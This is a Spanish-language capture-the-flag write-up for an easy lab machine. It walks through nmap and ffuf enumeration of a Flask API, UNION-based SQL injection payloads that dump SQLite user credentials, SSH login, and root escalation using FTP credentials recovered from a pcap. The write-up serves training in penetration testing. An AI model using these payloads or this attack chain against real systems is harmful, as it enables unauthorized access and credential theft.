
## Resumen
Es una máquina de dificultad fácil en la que tendremos que hacer SQL Injection y fuzzear a un endpoint de una API e investigar un archivo pcap para conseguir credenciales.

## Enumeración

Empiezo haciendo un ping a la máquina para saber con el TTL qué SO usa.

```
ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
```

Con esto sé que la máquina es Linux.

Procedo con nmap escaneando los puertos.

```
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u4 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:ab:09:61:00:7b:cc:18:48:8e:bf:8d:3d:e4:cd:b5 (RSA)
|   256 42:0c:71:44:7c:13:ba:8f:b7:82:35:f2:b3:f7:b9:ff (ECDSA)
|_  256 85:95:6c:96:ac:a1:f0:3e:1e:0d:c1:c8:b0:6f:bb:1d (ED25519)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2)
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: Werkzeug/1.0.1 Python/3.9.2
MAC Address: 26:66:26:15:CA:79 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos encontrados:

- `22/SSH`
- `Werkzeug/5000`

Ya que no tenemos credenciales del SSH, empiezo por el 5000.

## Análisis puerto 5000

Empiezo haciendo un curl a la web para verla detalladamente.

```
curl 172.17.0.2:5000
```
```json
{
  "message": "No endpoint selected. Please use /add to add a user or /users to query users."
}
```

Encuentro algo interesante, empiezo con `/users` para ver si nos lista los usuarios.

```
curl 172.17.0.2:5000/users
```
```json
{
  "error": "Invalid parameter"
}
```

Nos dice que el parámetro no es válido, así que a falta del parámetro realizo un fuzzing de parámetros.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://172.17.0.2:5000/users?FUZZ= -mc all -fs 32
```
```
username                [Status: 200, Size: 39, Words: 6, Lines: 4, Duration: 56ms]
```

Detecto que un parámetro devuelve una respuesta más larga que las demás, así que:

```
curl http://172.17.0.2:5000/users?username=a
```
```json
{
  "error": "User not found"
}
```

Pongo un `'` para probar la SQL Injection.

```
curl "http://172.17.0.2:5000/users?username='"
```

Y nos devuelve la página completa del debugger diciendo que la DB es `sqlite` y revelando la query:

```
query = f"SELECT * FROM users WHERE username = '{username}'"
```

Al ver la query concatenada directamente sin parametrizar, es probable que haya SQL Injection. Sigo enumerando columnas.

```
http://172.17.0.2:5000/users?username=a' UNION SELECT 1,2,3-- -
```

Sigo sacando el nombre de las tablas.

```
username=a' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- -
```
```json
[
  [
    1, 
    "users", 
    3
  ]
]
```

Y nos devuelve que hay una tabla `users`.
Sigo extrayendo la información de la tabla.

```
http://172.17.0.2:5000/users?username=a' UNION SELECT id,username,password FROM users-- -
```
```json
[
  [
    1, 
    "pingu", 
    "your_password"
  ], 
  [
    2, 
    "pingu", 
    "****"
  ]
]
```

Con estas credenciales me dispongo a iniciar sesión vía SSH.

```
ssh pingu@172.17.0.2
```

## Escalada de privilegios

Una vez dentro como el usuario `pingu`, veo que en el directorio home hay un archivo `.pcap`, así que lo investigo.

```
pingu@d42e022beeb2:/home$ ls
app.py  network.pcap  pingu  users.db
```

Dentro del archivo veo que hay unos paquetes FTP y en ellos se pasan las credenciales en texto plano. Encontrando así las credenciales de root.

```
LOGIN root
PASS ****
```

Inicio sesión como root.

```
su root
```
```
root@d42e022beeb2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@d42e022beeb2:~# 
```

## Flujo de ataque

1. **Enumeración**
   Encontramos un servidor Werkzeug vía nmap.
2. **Análisis puerto 5000**
   Fuzzeamos un endpoint llamado `users` y encontramos el parámetro `username`.
   Con el parámetro `username` se consigue hacer una SQL Injection y sacar credenciales que usamos contra el SSH.
3. **Escalada de privilegios**
   Se encuentra un archivo `.pcap` y al investigarlo se encuentran las credenciales de root con las que iniciamos sesión con `su root`.